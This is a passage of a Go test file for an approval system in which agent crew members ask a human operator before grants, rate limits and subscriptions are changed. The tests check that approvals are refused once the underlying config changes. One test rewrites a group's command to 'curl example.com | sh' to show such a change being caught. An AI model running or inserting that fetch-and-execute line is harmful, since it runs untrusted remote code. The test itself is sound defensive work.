package store

import (
	"encoding/json"
	"slices"
	"strings"
	"testing"

	bolt "go.etcd.io/bbolt"
)

const runCRM = `name: crm
base: https://crm.example.com/v1
credential: { env: CRM_TOKEN, header: "Authorization: Bearer {credential}" }
idempotency: Idempotency-Key
calls:
  find: { kind: read, request: { method: GET, path: /contacts } }
  get:
    kind: read
    params: { id: { type: string, pattern: "^[0-9]{1,12}$" } }
    request: { method: GET, path: "/contacts/{id}" }
  note:
    kind: update
    params:
      id: { type: string, pattern: "^[0-9]{1,12}$" }
      text: { type: string, max: 2000 }
    request: { method: POST, path: "/contacts/{id}/notes", body: { text: "{text}" } }
`

const crmAt = "the source crm (https://crm.example.com)"

// listYard is runYard with the source crm, which has two read calls and an
// update, the exec group builders, the herdr group reviewers and the crew
// member yardmaster, which herdr starts as claude.
func listYard(t *testing.T) *askYard {
	t.Helper()
	y, _ := runYard(t)
	if _, err := y.PutSource(y.ctx, "crm.yaml", runCRM, "mckean"); err != nil {
		t.Fatal(err)
	}
	for _, g := range []Group{
		{Name: "builders", Runner: "exec", Config: map[string]any{"cmd": "make build"}},
		{Name: "reviewers", Runner: "herdr", Config: map[string]any{"kind": "codex", "prompt": "roles/reviewer.md"}},
	} {
		if err := y.PutGroup(y.ctx, g, "mckean"); err != nil {
			t.Fatal(err)
		}
	}
	y.crew(t, map[string]any{"kind": "claude", "args": []string{"--careful"}})
	return y
}

// crew defines the crew member yardmaster again with config.
func (y *askYard) crew(t *testing.T, config map[string]any) {
	t.Helper()
	if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/yard", Config: config}, "mckean"); err != nil {
		t.Fatal(err)
	}
}

func listAsk(to string, command ...string) Ask {
	return Ask{Question: "May I?", To: to, Context: []string{"it is needed for the work"}, Run: &AskRun{Argv: command}}
}

// card is the card the yard would write now for the command an ask stored.
func (y *askYard) card(t *testing.T, was AskRun) AskRun {
	t.Helper()
	c, argv, err := parseRun(was.Argv)
	if err != nil {
		t.Fatal(err)
	}
	var card AskRun
	if err := y.write(func(w *wtx) (err error) {
		card, err = c.card(w, argv, false)
		return err
	}); err != nil {
		t.Fatal(err)
	}
	return card
}

// source is the source crm as the yard holds it.
func (y *askYard) source(t *testing.T) *Source {
	t.Helper()
	src, err := y.GetSource(y.ctx, "crm")
	if err != nil {
		t.Fatal(err)
	}
	return src
}

// grants are who holds what of crm, "<grantee>: <calls>".
func (y *askYard) grants(t *testing.T) []string {
	t.Helper()
	gs, err := y.SourceGrants(y.ctx, "crm")
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, g := range gs {
		out = append(out, g.Grantee.String()+": "+strings.Join(g.Calls, ","))
	}
	return out
}

// approved holds the event e to the ask seq it was approved on.
func (y *askYard) approved(t *testing.T, e Event, seq uint64) {
	t.Helper()
	got, _ := json.Marshal(e.Data["approved"])
	want, _ := json.Marshal(map[string]any{"bead": y.bead, "ask": seq})
	if e.Actor != "mckean" || string(got) != string(want) {
		t.Errorf("the event %s by %s carries approved %s, want it by mckean with %s", e.Kind, e.Actor, got, want)
	}
}

// refusedStale approves the ask seq and holds the refusal to want, with the
// words every stale approval ends in, and the ask to be open still.
func (y *askYard) refusedStale(t *testing.T, seq uint64, want string) {
	t.Helper()
	_, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean")
	if err == nil || !strings.Contains(err.Error(), want) || !strings.HasSuffix(err.Error(), nothingRan) {
		t.Fatalf("ApproveAsk = %v, want %q and then %q", err, want, nothingRan)
	}
	if r := y.asked(t, seq); r.State != AskOpen {
		t.Fatalf("the ask is %s after a refused approval", r.State)
	}
}

// sameCard holds the card the yard would write now to read as the one the
// ask stored, sentence for sentence, with only what it saw of key another.
func (y *askYard) sameCard(t *testing.T, seq uint64, key string) {
	t.Helper()
	was := *y.asked(t, seq).Ask.Run
	now := y.card(t, was)
	if !slices.Equal(now.Does, was.Does) || now.Back != was.Back || now.BackBy != was.BackBy {
		t.Fatalf("the test wants cards that read the same:\n%q %q\n%q %q", was.Does, was.Back, now.Does, now.Back)
	}
	if len(was.Seen[key]) != 64 || now.Seen[key] == was.Seen[key] {
		t.Fatalf("seen[%q] = %q on the ask and %q now, want a SHA-256 and another", key, was.Seen[key], now.Seen[key])
	}
	for k, v := range was.Seen {
		if k != key && now.Seen[k] != v {
			t.Fatalf("seen[%q] changed too", k)
		}
	}
}

// A source's calls an hour are asked in the yard's form, shown with the
// source's host and the limit that stands, approved in one write through
// SetSource, and taken back by the operator alone, which the card says.
func TestRunAskSourceLimit(t *testing.T) {
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "yardr  source set crm calls_per_hour=0200"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	want := AskRun{
		Argv:   []string{"source", "set", "crm", "calls_per_hour=200"},
		Does:   []string{crmAt + " may be called 200 times an hour by each session or crew member that may call it. It may be called 60 times now."},
		Back:   "yardr source set crm calls_per_hour=60",
		BackBy: "only the operator",
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != want.BackBy ||
		len(run.Seen) != 1 || run.Seen["source crm"] != seen(runCRM, "", "") {
		t.Fatalf("the ask stores %+v, want %+v", run, want)
	}
	card := y.asked(t, seq).Lines()
	for _, line := range []string{
		"      yardr source set crm calls_per_hour=200",
		"  the yard says: " + want.Does[0],
		"  only the operator can take it back: yardr source set crm calls_per_hour=60",
	} {
		if !slices.Contains(card, line) {
			t.Errorf("the card lacks %q:\n%s", line, strings.Join(card, "\n"))
		}
	}
	if slices.ContainsFunc(card, func(l string) bool { return strings.Contains(l, "anyone") }) {
		t.Errorf("the card says anyone takes a source's limit back:\n%s", strings.Join(card, "\n"))
	}
	if q, err := y.UserAsks(y.ctx, "mckean"); err != nil || len(q.Open) != 1 || q.Open[0].Run.BackBy != "only the operator" {
		t.Fatalf("the queue's row = %+v, %v", q, err)
	}
	// The source's other limit is no part of the card.
	if _, err := y.SetSource(y.ctx, "crm", SourceUpdatesPerHour, "3", "mckean"); err != nil {
		t.Fatal(err)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean")
	if err != nil {
		t.Fatal(err)
	}
	if done.Result != "source crm: 200 calls an hour for each caller, 3 of them updates at most" {
		t.Fatalf("the approval printed %q", done.Result)
	}
	if src := y.source(t); src.CallsPerHour != 200 || src.UpdatesPerHour != 3 {
		t.Fatalf("the source after the approval = %+v", src)
	}
	evs, _ := y.EventsOfKind(y.ctx, "source_set", 10)
	if len(evs) != 2 || evs[1].Data[SourceCallsPerHour] != "200" {
		t.Fatalf("source_set events = %+v", evs)
	}
	y.approved(t, evs[1], seq)
	if card := y.asked(t, seq).Lines(); !slices.Contains(card, "  only the operator can take it back: yardr source set crm calls_per_hour=60") {
		t.Errorf("the approved card:\n%s", strings.Join(card, "\n"))
	}

	// The updates among them, and a lower number, which is the operator's
	// to set as a higher one is.
	seq = y.ask(t, listAsk("mckean", "source set crm updates_per_hour=2"), "yardmaster")
	run = *y.asked(t, seq).Ask.Run
	if want := crmAt + " may be sent 2 calls an hour that change something there (updates) by each session or crew member that may make them. It may be sent 3 now."; run.Does[0] != want ||
		run.Back != "yardr source set crm updates_per_hour=3" {
		t.Fatalf("the ask for updates stores %+v", run)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean"); err != nil || y.source(t).UpdatesPerHour != 2 {
		t.Fatalf("the approval = %v, the source %+v", err, y.source(t))
	}
}

// An approval of a source's limit is refused when the limit is not the one
// the card says it is.
func TestRunAskSourceLimitChanged(t *testing.T) {
	for _, c := range []struct{ to, want string }{
		{"100", "ask 1 says calls_per_hour of the source crm is 60 now, and it is 100: the card is from before that changed. "},
		{"200", "ask 1 says calls_per_hour of the source crm is 60 now, and it is 200 already: nothing is left to change. "},
	} {
		y := listYard(t)
		seq := y.ask(t, listAsk("mckean", "source set crm calls_per_hour=200"), "yardmaster")
		if _, err := y.SetSource(y.ctx, "crm", SourceCallsPerHour, c.to, "mckean"); err != nil {
			t.Fatal(err)
		}
		y.refusedStale(t, seq, c.want)
		if got := y.source(t).CallsPerHour; strings.TrimLeft(c.to, "0") != jsonNumber(got) {
			t.Fatalf("the refused approval left the limit at %d", got)
		}
	}
}

func jsonNumber(n int) string { b, _ := json.Marshal(n); return string(b) }

// A run ask about a source is held to the source it was written from by a
// SHA-256 over its declaration text, its env_file and its mint_command. A
// declaration that replaces it with the same host and a call of the same
// name, kind, method and path whose body differs reads the same on the
// card, sentence for sentence, and is another: the approval is refused. So
// is one after env_file or mint_command was set.
func TestRunAskIsHeldToTheSource(t *testing.T) {
	for _, c := range []struct {
		name    string
		command string
		change  func(t *testing.T, y *askYard)
		want    string
	}{
		{"the declaration replaced", "source grant crm note --crew yardmaster", func(t *testing.T, y *askYard) {
			other := strings.Replace(runCRM, `body: { text: "{text}" }`, `body: { text: "{text}", public: true }`, 1)
			if other == runCRM {
				t.Fatal("the test replaces nothing")
			}
			if _, err := y.PutSource(y.ctx, "crm.yaml", other, "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written from another declaration of the source crm: it was replaced since (source_added, 12 Oct 14:00, by mckean). "},
		{"env_file set", "source grant crm read --group builders", func(t *testing.T, y *askYard) {
			if _, err := y.SetSource(y.ctx, "crm", SourceEnvFile, "/elsewhere/crm.env", "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written when the source crm took its credential from elsewhere: its env_file was set since (source_set, 12 Oct 14:00, by mckean). "},
		{"mint_command changed", "source set crm calls_per_hour=200", func(t *testing.T, y *askYard) {
			if _, err := y.SetSource(y.ctx, "crm", SourceMintCommand, "/usr/local/bin/mint", "mckean"); err != nil {
				t.Fatal(err)
			}
		}, "ask 1 was written when the source crm took its credential from elsewhere: its mint_command was set since (source_set, 12 Oct 14:00, by mckean). "},
	} {
		t.Run(c.name, func(t *testing.T) {
			y := listYard(t)
			seq := y.ask(t, listAsk("mckean", c.command), "yardmaster")
			c.change(t, y)
			y.sameCard(t, seq, "source crm")
			y.refusedStale(t, seq, strings.Replace(c.want, "12 Oct 14:00", y.now.Local().Format("2 Jan 15:04"), 1))
			if src := y.source(t); src.CallsPerHour != 0 || len(y.grants(t)) != 0 {
				t.Fatalf("the refused approval changed the source: %+v, %v", src, y.grants(t))
			}
		})
	}
}

// A grant of a source's calls names each call with its method and path,
// says of read which calls that is today and that it covers what the source
// is later given, and of an update call that it changes something there. A
// command with several --crew and --group is one ask, and its approval one
// write: a grant and an event for each, all of them approved on the ask.
func TestRunAskGrant(t *testing.T) {
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "source grant crm read --crew=yardmaster --group reviewers --group builders --group reviewers"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	const read = "may make every read call of " + crmAt + ", with the credential the yard holds for it: today that is find (GET /contacts), get (GET /contacts/{id}), and it covers any read call the operator later gives the source. It is granted nothing of crm now."
	want := AskRun{
		Argv: []string{"source", "grant", "crm", "read", "--group", "builders", "--group", "reviewers", "--crew", "yardmaster"},
		Does: []string{
			"the group builders (exec), and so each session it starts, " + read,
			"the group reviewers (herdr, codex), and so each session it starts, " + read,
			"the crew member yardmaster (herdr, claude) " + read,
		},
		Back: "yardr source revoke crm read --group builders --group reviewers --crew yardmaster",
		Seen: map[string]string{
			"source crm":      seen(runCRM, "", ""),
			"group builders":  seen("exec", map[string]any{"cmd": "make build"}),
			"group reviewers": seen("herdr", map[string]any{"kind": "codex", "prompt": "roles/reviewer.md"}),
			"crew yardmaster": seen("herdr", map[string]any{"kind": "claude", "args": []string{"--careful"}}, "/yard"),
		},
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != "" || !sameMap(run.Seen, want.Seen) {
		t.Fatalf("the ask stores\n%+v\nwant\n%+v", run, want)
	}
	if card := y.asked(t, seq).Lines(); !slices.Contains(card, "  anyone can take it back: "+want.Back) || !slices.Contains(card, "  the yard says: "+want.Does[2]) {
		t.Errorf("the card:\n%s", strings.Join(card, "\n"))
	}

	// What neither the sentences nor what the ask saw cover leaves the
	// approval good: the source's limits, another grantee's grant, the
	// group's limit, and what the daemon writes of a crew member as it runs.
	if _, err := y.SetSource(y.ctx, "crm", SourceCallsPerHour, "5", "mckean"); err != nil {
		t.Fatal(err)
	}
	if err := y.PutGroup(y.ctx, Group{Name: "others", Runner: "exec", Config: map[string]any{"cmd": "true"}}, "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.GrantSource(y.ctx, "crm", "note", Grantee{Group: "others"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	limit := 4
	if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Limit: &limit}, "yardmaster"); err != nil {
		t.Fatal(err)
	}
	before, err := y.GetCrew(y.ctx, "yardmaster")
	if err != nil {
		t.Fatal(err)
	}
	if err := y.CrewStarted(y.ctx, "yardmaster", map[string]any{"pane": "%7"}); err != nil {
		t.Fatal(err)
	}
	if after, err := y.GetCrew(y.ctx, "yardmaster"); err != nil || after.State != "running" || after.Handle["pane"] != "%7" || after.Revision == before.Revision {
		t.Fatalf("the test wants a crew member whose state, handle and revision moved: %+v, %v", after, err)
	}

	writes := y.writes(t)
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean")
	if err != nil {
		t.Fatal(err)
	}
	if got := y.writes(t); got != writes+1 {
		t.Errorf("the approval was %d writes of the store, want one", got-writes)
	}
	if want := "group builders may call crm: read\ngroup reviewers may call crm: read\ncrew member yardmaster may call crm: read"; done.Result != want {
		t.Fatalf("the approval printed %q, want %q", done.Result, want)
	}
	if got, want := y.grants(t), []string{"crew member yardmaster: read", "group builders: read", "group others: note", "group reviewers: read"}; !slices.Equal(got, want) {
		t.Fatalf("the grants after the approval = %v, want %v", got, want)
	}
	evs, _ := y.EventsOfKind(y.ctx, "source_granted", 10)
	if len(evs) != 4 {
		t.Fatalf("source_granted events = %+v", evs)
	}
	for _, e := range evs[1:] {
		y.approved(t, e, seq)
	}
	card := y.asked(t, seq).Lines()
	i := slices.Index(card, "  mckean approved, ran: yardr source grant crm read --group builders --group reviewers --crew yardmaster")
	if i < 0 || !slices.Equal(card[i+1:i+5], []string{
		"      group builders may call crm: read",
		"      group reviewers may call crm: read",
		"      crew member yardmaster may call crm: read",
		"  anyone can take it back: " + want.Back,
	}) {
		t.Errorf("the approved card:\n%s", strings.Join(card, "\n"))
	}
	// Anyone takes it back.
	if _, err := y.RevokeSource(y.ctx, "crm", "read", Grantee{Crew: "yardmaster"}, "ada"); err != nil {
		t.Fatal(err)
	}

	// One call by its name: an update changes something there, and the
	// card says what the grantee holds now.
	seq = y.ask(t, listAsk("mckean", "source grant crm note --group builders"), "yardmaster")
	run = *y.asked(t, seq).Ask.Run
	if want := "the group builders (exec), and so each session it starts, may make the call note (POST /contacts/{id}/notes) of " + crmAt +
		", with the credential the yard holds for it, which changes something there. It is granted read (every read call) of crm now."; run.Does[0] != want {
		t.Fatalf("the sentence of an update call = %q, want %q", run.Does[0], want)
	}
	if done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean"); err != nil || done.Result != "group builders may call crm: note (update), read" {
		t.Fatalf("the approval = %+v, %v", done, err)
	}
	seq = y.ask(t, listAsk("mckean", "source grant crm get --crew yardmaster"), "yardmaster")
	if does := y.asked(t, seq).Ask.Run.Does[0]; !strings.Contains(does, "may make the call get (GET /contacts/{id}) of "+crmAt) ||
		!strings.Contains(does, "which the declaration says reads there and changes nothing. It is granted nothing of crm now.") {
		t.Fatalf("the sentence of a read call = %q", does)
	}
}

// writes is how many write transactions the store has committed: each takes
// the next id.
func (y *askYard) writes(t *testing.T) int {
	t.Helper()
	var id int
	if err := y.db.View(func(tx *bolt.Tx) error {
		id = tx.ID()
		return nil
	}); err != nil {
		t.Fatal(err)
	}
	return id
}

// A run ask for a grant is held to each group it names by a SHA-256 over
// the group's runner and config, and to each crew member by one over its
// runner, config and directory. A group given another command or prompt
// under its name, and a crew member given other arguments, read the same
// on the card and are another: the approval is refused.
func TestRunAskGrantIsHeldToTheGrantee(t *testing.T) {
	at := func(y *askYard) string { return y.now.Local().Format("2 Jan 15:04") }
	for _, c := range []struct {
		name, key string
		change    func(t *testing.T, y *askYard)
		want      func(y *askYard) string
	}{
		{"an exec group's cmd with SetGroup", "group builders", func(t *testing.T, y *askYard) {
			if _, err := y.SetGroup(y.ctx, "builders", GroupEdit{Set: map[string]any{"cmd": "curl example.com | sh"}}, "yardmaster"); err != nil {
				t.Fatal(err)
			}
		}, func(y *askYard) string {
			return "ask 1 was written when the group builders was another: its config was changed since (group_set, " + at(y) + ", by yardmaster). "
		}},
		{"a herdr group's prompt with PutGroup", "group reviewers", func(t *testing.T, y *askYard) {
			if err := y.PutGroup(y.ctx, Group{Name: "reviewers", Runner: "herdr", Config: map[string]any{"kind": "codex", "prompt": "roles/other.md"}}, "yardmaster"); err != nil {
				t.Fatal(err)
			}
		}, func(y *askYard) string {
			return "ask 1 was written when the group reviewers was another: its config was changed since (group_set, " + at(y) + ", by yardmaster). "
		}},
		{"a crew member's args with PutCrew", "crew yardmaster", func(t *testing.T, y *askYard) {
			if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/yard",
				Config: map[string]any{"kind": "claude", "args": []string{"--dangerously"}}}, "yardmaster"); err != nil {
				t.Fatal(err)
			}
		}, func(y *askYard) string {
			return "ask 1 was written when the crew member yardmaster was another: its config was changed since (crew_defined, " + at(y) + ", by yardmaster). "
		}},
	} {
		t.Run(c.name, func(t *testing.T) {
			y := listYard(t)
			seq := y.ask(t, listAsk("mckean", "source grant crm read --group builders --group reviewers --crew yardmaster"), "yardmaster")
			c.change(t, y)
			y.sameCard(t, seq, c.key)
			y.refusedStale(t, seq, c.want(y))
			if got := y.grants(t); len(got) != 0 {
				t.Fatalf("the refused approval granted %v", got)
			}
			if evs, _ := y.EventsOfKind(y.ctx, "source_granted", 10); len(evs) != 0 || len(answerNotes(t, y)) != 0 {
				t.Fatalf("the refused approval logged %+v", evs)
			}
		})
	}
	// A crew member's directory is part of what it is.
	y := listYard(t)
	seq := y.ask(t, listAsk("mckean", "source grant crm read --crew yardmaster"), "yardmaster")
	if _, err := y.PutCrew(y.ctx, CrewMember{Name: "yardmaster", Runner: "herdr", Dir: "/elsewhere",
		Config: map[string]any{"kind": "claude", "args": []string{"--careful"}}}, "yardmaster"); err != nil {
		t.Fatal(err)
	}
	y.sameCard(t, seq, "crew yardmaster")
	y.refusedStale(t, seq, "was written when the crew member yardmaster was another")

	// And a grant the grantee was given in between is on the card.
	y = listYard(t)
	seq = y.ask(t, listAsk("mckean", "source grant crm note --crew yardmaster"), "yardmaster")
	if _, err := y.GrantSource(y.ctx, "crm", "read", Grantee{Crew: "yardmaster"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	y.refusedStale(t, seq, "It is granted read (every read call) of crm now.\" now: the card is from before that changed. ")
}

// What the new rows refuse when they are asked, each with nothing stored: a
// setting of a source that is no number, the flags of peer allow that are
// not the list's, a flag of the list beside one that is not, and what the
// yard would refuse or what would change nothing.
func TestRunAskListRefusals(t *testing.T) {
	y := listYard(t)
	if _, err := y.GrantSource(y.ctx, "crm", "read", Grantee{Group: "builders"}, "mckean"); err != nil {
		t.Fatal(err)
	}
	const terminal = "the operator's to type in a terminal"
	for _, c := range []struct{ command, want string }{
		{"source set crm env_file=/tmp/crm.env", "source set with env_file= is " + terminal},
		{"source set crm env_file=", "source set with env_file= is " + terminal},
		{"source set crm mint_command=/usr/local/bin/mint", "source set with mint_command= is " + terminal},
		{"source set crm mint_command=", "source set with mint_command= is " + terminal},
		{"source set crm calls_per_hour=", "source set with calls_per_hour= and nothing after it is " + terminal},
		{"source set crm calls_per_hour=200 --actor mckean", "source set with --actor is " + terminal},
		{"source set crm calls_per_hour=200 updates_per_hour=3", "one source and one setting, not 3 words"},
		{"source set crm calls_per_hour=0", `source crm: calls_per_hour="0": want a whole number from 1`},
		{"source set crm calls_per_hour=many", `calls_per_hour="many": want a whole number from 1`},
		{"source set crm calls_per_hour=60", "source crm: calls_per_hour is 60 already, so the command would change nothing"},
		{"source set erp calls_per_hour=200", "source erp: not found"},
		{"source add crm.yaml", "anything else is " + terminal},
		{"source key crm", "anything else is " + terminal},
		{"source rm crm", "anything else is " + terminal},
		{"peer allow airy --trust mckean=mckean", "peer allow with --trust is " + terminal},
		{"peer allow airy --trust mckean@airy=mckean", "A command that needs it is " + terminal},
		{"peer allow airy --reach mckean=mckean", "peer allow with --reach is " + terminal},
		{"peer allow airy --reach mckean@airy=mckean", "A command that needs it is " + terminal},
		{"peer allow airy --send mail", "peer allow with --send is " + terminal},
		{"peer allow airy --receive bead", "peer allow with --receive is " + terminal},
		{"peer allow airy --expose mckean", "peer allow with --expose is " + terminal},
		{"peer allow airy --mail-limit 300 --expose mckean", "peer allow with --expose is " + terminal},
		{"peer allow airy --mail-limit 300 --reach mckean=mckean", "peer allow with --reach is " + terminal},
		{"source grant crm read --crew yardmaster --actor mckean", "source grant with --actor is " + terminal},
		{"source grant crm read", "it names nobody the grant is for"},
		{"source grant crm --crew yardmaster", "one source and read or one call, not 1 words"},
		{"source grant crm read --crew", "--crew needs its value"},
		{"source grant crm write --crew yardmaster", `source crm has no call "write" (it has: find, get, note)`},
		{"source grant erp read --crew yardmaster", "source erp: not found"},
		{"source grant crm read --crew nobody", "crew member nobody: not found"},
		{"source grant crm read --group nobody", "group nobody: not found"},
		{"source grant crm read --group builders --crew yardmaster", "group builders is granted read of the source crm already"},
		{"source grant crm find --group builders", "group builders may make find of the source crm already, through its grant of read"},
		{"subscribe mckean linear --where type=issue", "a subscription to linear is the user's own or the operator's to type in a terminal"},
		{"subscribe mckean yardr --done --scope mentions", "subscribe with --scope is the user's own or the operator's to type in a terminal"},
		{"subscribe mckean yardr", "with neither it is every event of every bead"},
		{"subscribe mckean --done", "one user and the source yardr, not 1 words"},
		{"subscribe mckean yardr --where state=open", `subscribe: state "open": only done`},
		{"subscribe mckean yardr --where depot", `--where "depot": want key=value`},
		{"subscribe mckean yardr --where colour=red", `subscribe: cannot filter yardr on "colour"`},
		{"subscribe mckean yardr --where bead=yd-none", "subscribe: bead:"},
		{"subscribe yardmaster yardr --done", "a run ask subscribes a user of the yard (yardr user list), and yardmaster is none"},
		{"subscribe eve yardr --done", "and eve is none"},
	} {
		if _, err := y.AddAsk(y.ctx, y.bead, listAsk("mckean", c.command), "yardmaster"); err == nil || !strings.Contains(err.Error(), c.want) {
			t.Errorf("--run %q = %v, want %q", c.command, err, c.want)
		}
	}
	if notes, err := y.Notes(y.ctx, y.bead); err != nil || len(notes) != 0 {
		t.Fatalf("the refused asks left %d notes, %v", len(notes), err)
	}
}

// subs are the subscriptions of the user name, as they are typed.
func (y *askYard) subs(t *testing.T, name string) []string {
	t.Helper()
	u, err := y.GetUser(y.ctx, name)
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, s := range u.Subscriptions {
		out = append(out, s.String())
	}
	return out
}

// A user's own subscription to the yard's events is asked of the user or of
// the operator, and the one asked approves it: the yard says what will land
// in the user's inbox and whether it is sent on outside the yard, and the
// approval subscribes under the check a subscription typed at a terminal
// has. Nobody else approves, and the user or the operator takes it back.
func TestRunAskSubscribe(t *testing.T) {
	y := listYard(t)
	// It began here: the yardmaster could not subscribe the operator.
	if err := y.AddSubscription(y.ctx, "mckean", Subscription{Source: SourceYardr, Scope: ScopeAll, Where: map[string]string{"state": StateDone}}, "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "a crew member does not decide what a person is told: mckean subscribes themselves, or the operator does it for them") {
		t.Fatalf("the test wants the check a subscription has: %v", err)
	}
	seq := y.ask(t, listAsk("mckean", "yardr subscribe mckean yardr --where label=ui --where depot=yardr --where state=done --where label=web --where label=ui"), "yardmaster")
	run := *y.asked(t, seq).Ask.Run
	want := AskRun{
		Argv: []string{"subscribe", "mckean", "yardr", "--done", "--where", "depot=yardr", "--where", "label=ui", "--where", "label=web"},
		Does: []string{
			"mckean gets a line among the notifications of their inbox for each bead that becomes done where depot is yardr, and label is ui or web (the subscription yardr all depot=yardr label=ui label=web state=done). They have no such subscription now.",
			"Nothing sends it on outside the yard: no source tells mckean of notifications there.",
		},
		Back:   "yardr unsubscribe mckean yardr --where depot=yardr --where label=ui --where label=web --where state=done",
		BackBy: "mckean or the operator",
		Seen:   map[string]string{"user mckean": seen("", "", []string(nil))},
	}
	if !slices.Equal(run.Argv, want.Argv) || !slices.Equal(run.Does, want.Does) || run.Back != want.Back || run.BackBy != want.BackBy || !sameMap(run.Seen, want.Seen) {
		t.Fatalf("the ask stores\n%+v\nwant\n%+v", run, want)
	}
	card := y.asked(t, seq).Lines()
	for _, line := range []string{
		"  when you approve, the yard runs this as mckean, and nothing else:",
		"      yardr subscribe mckean yardr --done --where depot=yardr --where label=ui --where label=web",
		"  the yard says: " + want.Does[1],
		"  mckean or the operator can take it back: " + want.Back,
	} {
		if !slices.Contains(card, line) {
			t.Errorf("the card lacks %q:\n%s", line, strings.Join(card, "\n"))
		}
	}
	const whose = "approving this command is mckean's, whom it was asked of: the yard runs it as them; "
	for actor, want := range map[string]string{"yardmaster": whose + "yardmaster is a crew member", "ada": whose + "this is ada", "": whose + "this is nobody"} {
		if _, err := y.ApproveAsk(y.ctx, y.bead, seq, actor); err == nil || !strings.Contains(err.Error(), want) {
			t.Errorf("an approval by %q = %v, want %q", actor, err, want)
		}
	}
	if got := y.subs(t, "mckean"); len(got) != 0 {
		t.Fatalf("refused approvals subscribed mckean to %v", got)
	}
	done, err := y.ApproveAsk(y.ctx, y.bead, seq, "mckean")
	if err != nil {
		t.Fatal(err)
	}
	const sub = "yardr all depot=yardr label=ui label=web state=done"
	if done.Result != "mckean subscribed: "+sub || !slices.Equal(y.subs(t, "mckean"), []string{sub}) {
		t.Fatalf("the approval printed %q, and mckean subscribes to %v", done.Result, y.subs(t, "mckean"))
	}
	evs, _ := y.EventsOfKind(y.ctx, "subscribed", 10)
	if len(evs) != 1 || evs[0].Data["user"] != "mckean" || evs[0].Data["subscription"] != sub {
		t.Fatalf("subscribed events = %+v", evs)
	}
	y.approved(t, evs[0], seq)
	// The command the card names takes exactly that back, and a crew
	// member does not run it.
	where := map[string]string{"depot": "yardr", "label": JoinWhere([]string{"ui", "web"}), "state": StateDone}
	if _, err := y.RemoveSubscriptions(y.ctx, "mckean", SourceYardr, "", where, "yardmaster"); err == nil {
		t.Fatal("a crew member took a user's subscription back")
	}
	if n, err := y.RemoveSubscriptions(y.ctx, "mckean", SourceYardr, "", where, "mckean"); err != nil || n != 1 {
		t.Fatalf("taking it back = %d, %v", n, err)
	}
}

// A subscription of another user is theirs to approve, or the operator's
// for them: the ask is put to one of the two and to nobody else, the one
// asked approves it, and the store's own check runs under the approval.
func TestRunAskSubscribeIsTheUsersOrTheOperators(t *testing.T) {
	y := listYard(t)
	if _, err := y.AddUser(y.ctx, "bo", "mckean"); err != nil {
		t.Fatal(err)
	}
	const command = "subscribe ada yardr --done"
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("bo", command), "yardmaster"); err == nil ||
		!strings.Contains(err.Error(), "this command is ada's to approve, or the operator's (mckean) for them: the yard runs it as the one who approves, so bo cannot be asked to") {
		t.Fatalf("an ask of a third user = %v", err)
	}
	own := y.ask(t, listAsk("ada", command), "yardmaster")
	if card := y.asked(t, own).Lines(); !slices.Contains(card, "  when you approve, the yard runs this as ada, and nothing else:") ||
		!slices.Contains(card, "  ada or the operator can take it back: yardr unsubscribe ada yardr --where state=done") {
		t.Fatalf("the card:\n%s", strings.Join(card, "\n"))
	}
	// The operator is not the one asked.
	if _, err := y.ApproveAsk(y.ctx, y.bead, own, "mckean"); err == nil || !strings.Contains(err.Error(), "approving this command is ada's, whom it was asked of") {
		t.Fatalf("the operator's approval of ada's ask = %v", err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, own, "ada"); err != nil {
		t.Fatal(err)
	}
	evs, _ := y.EventsOfKind(y.ctx, "subscribed", 10)
	if len(evs) != 1 || evs[0].Actor != "ada" || !slices.Equal(y.subs(t, "ada"), []string{"yardr all state=done"}) {
		t.Fatalf("ada's own approval left %+v and %v", evs, y.subs(t, "ada"))
	}
	// Once made, the same ask would change nothing.
	if _, err := y.AddAsk(y.ctx, y.bead, listAsk("ada", command), "yardmaster"); err == nil || !strings.Contains(err.Error(), "ada is subscribed to yardr all state=done already, so the command would change nothing") {
		t.Fatalf("an ask for a subscription ada has = %v", err)
	}
	// The operator, asked for another of ada's, approves it for them.
	for_ := y.ask(t, listAsk("mckean", "subscribe ada yardr --where kind=held"), "yardmaster")
	if _, err := y.ApproveAsk(y.ctx, y.bead, for_, "ada"); err == nil || !strings.Contains(err.Error(), "approving this command is mckean's, whom it was asked of") {
		t.Fatalf("ada's approval of the operator's ask = %v", err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, for_, "mckean"); err != nil {
		t.Fatal(err)
	}
	if got := y.subs(t, "ada"); !slices.Equal(got, []string{"yardr all state=done", "yardr all kind=held"}) {
		t.Fatalf("ada subscribes to %v", got)
	}
	// The approval runs under the check a subscription has, as it stands
	// when it runs: an operator who is one no more subscribes nobody else.
	late := y.ask(t, listAsk("mckean", "subscribe ada yardr --where kind=closed"), "yardmaster")
	if err := y.SetSetting(y.ctx, OperatorSetting, "bo", "mckean"); err != nil {
		t.Fatal(err)
	}
	if _, err := y.ApproveAsk(y.ctx, y.bead, late, "mckean"); err == nil || !strings.Contains(err.Error(), "this command is ada's own to approve, or the operator's for them, and mckean is neither now") {
